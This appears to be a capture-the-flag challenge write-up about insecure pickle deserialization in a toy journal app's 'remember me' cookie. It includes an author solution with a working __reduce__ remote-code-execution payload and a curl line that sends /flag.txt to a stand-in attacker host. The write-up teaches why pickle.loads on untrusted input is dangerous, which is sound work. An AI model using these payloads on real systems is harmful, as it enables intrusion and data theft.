# Insecure Deserialization — DiaryBox

A toy journal app where the "remember me" cookie is a base64-encoded
Python pickle of the user's profile object. Every request decodes
the cookie via `pickle.loads`. Attacker-controlled bytes flow into
`pickle.loads`. Classic RCE primitive.

## Player target

Exfiltrate `/flag.txt` (readable to the app's UID).

## Author solution sketch

```python
import base64, pickle, os, requests

class Pwn:
    def __reduce__(self):
        return (os.system, ("cp /flag.txt /tmp/.f && chmod 644 /tmp/.f",))

cookie = base64.b64encode(pickle.dumps(Pwn())).decode()
requests.get("http://target:5000/", cookies={"diarybox_user": cookie})
# now read /tmp/.f via any path that returns file contents, e.g.
# add another reduce that os.popen + sends to your listener.
```

Cleaner end-to-end (out-of-band, no second read needed):

```python
class Pwn:
    def __reduce__(self):
        return (os.system, ("curl --data-binary @/flag.txt http://ATTACKER/x",))
```

## Why this is the lesson

`pickle.loads` is documented in the stdlib as unsafe on untrusted
input. Treat any "I'll just pickle the session blob, it's
convenient" as an unauthenticated RCE primitive.
